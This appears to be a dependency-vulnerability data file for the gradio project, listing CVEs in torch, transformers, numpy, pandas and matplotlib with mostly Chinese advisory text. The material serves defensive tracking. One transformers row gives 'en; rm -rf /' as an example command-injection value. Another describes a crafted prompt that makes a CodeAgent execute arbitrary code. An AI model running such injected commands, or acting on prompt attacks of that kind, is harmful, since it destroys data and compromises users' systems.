gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
